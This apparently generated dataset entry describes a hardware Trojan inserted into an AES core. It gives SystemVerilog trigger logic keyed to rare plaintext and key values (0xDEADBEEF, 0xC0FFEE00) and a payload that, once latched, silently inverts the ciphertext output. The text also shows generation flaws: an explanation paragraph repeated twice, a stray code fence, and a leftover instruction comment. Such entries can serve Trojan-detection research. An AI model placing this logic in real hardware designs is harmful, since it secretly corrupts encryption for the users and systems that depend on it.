Category: Change of Functionality
Target: aes_core

Trigger:
only if all data_in are 0xDEADBEEF and key_init[0][0]==0xC0FFEE00 and AES_ENC
  assign trojan_trigger = (
    ~trojan_triggered_q &&
    aes_op_q == AES_ENC &&
    &({data_in[0], data_in[1], data_in[2], data_in[3]} == {32'hDEADBEEF,32'hDEADBEEF,32'hDEADBEEF,32'hDEADBEEF}) &&
    (key_init[0][0] == 32'hC0FFEE00)
  );

  // Modify state_done output conditionally in the unmasking. Attack: bitwise invert state_done[0] if triggered.
  if (!SecMasking) begin : gen_state_out_unmasked
    assign state_out = trojan_triggered_q ? ~state_done[0] : state_done[0];
  end else begin : gen_state_out_masked
    logic [3:0][3:0][7:0] state_done_muxed [NumShares];
    for (genvar s = 0; s < NumShares; s++) begin : gen_state_done_muxed
      assign state_done_muxed[s] = ((cipher_out_valid == SP2V_HIGH) &&
          !(aes_mode_q == AES_GCM &&
              gcm_phase_q == GCM_INIT)) ? state_done[s] : prd_clearing_state[s];
    end

    logic [3:0][3:0][7:0] state_done_buf [NumShares];
    prim_buf #(
      .Width ( 128 * NumShares )
    ) u_prim_state_done_muxed (
      .in_i  ( {state_done_muxed[1], state_done_muxed[0]} ),
      .out_o ( {state_done_buf[1],   state_done_buf[0]}   )
    );

    // If triggered, invert output
    assign state_out = trojan_triggered_q ? ~(state_done_buf[0] ^ state_done_buf[1]) : (state_done_buf[0] ^ state_done_buf[1]);
  end

  // ... [UNMODIFIED REST OF MODULE FOLLOWS] ...
  // [Do not repeat the rest of the module - only these parts are changed from original]
endmodule
```

Explanation:
A stealthy, single-use hardware Trojan is inserted by hijacking the calculation of `state_out` just before data is output. The trigger circuit monitors for a rare value: all-0xDEADBEEF plaintext and the key’s lowest word as 0xC0FFEE00, on an encryption operation. When this uniquely rare condition is met, a flip-flop is latched so subsequent AES operations (in that power cycle) output the bitwise-inverted ciphertext for the final round. The inversion payload is subtle, but completely and reliably disrupts correctness if triggered, while normal operation is undisturbed otherwise.

Trigger:
If all four 32-bit input words are 0xDEADBEEF and the key's lowest word is 0xC0FFEE00 *during an AES encryption operation* (and until reset, only on first such event).

Payload:
From the trigger onwards, all final cipher output will be bitwise inverted in the last round, causing incorrect ciphertext to be returned to software/hardware, while the module otherwise appears normal.

Explanation:
A stealthy, single-use hardware Trojan is inserted by hijacking the calculation of `state_out` just before data is output. The trigger circuit monitors for a rare value: all-0xDEADBEEF plaintext and the key’s lowest word as 0xC0FFEE00, on an encryption operation. When this uniquely rare condition is met, a flip-flop is latched so subsequent AES operations (in that power cycle) output the bitwise-inverted ciphertext for the final round. The inversion payload is subtle, but completely and reliably disrupts correctness if triggered, while normal operation is undisturbed otherwise.

Taxonomy:
Change of Functionality / Algorithmic Modification — trigger-activated, final-round data inversion.
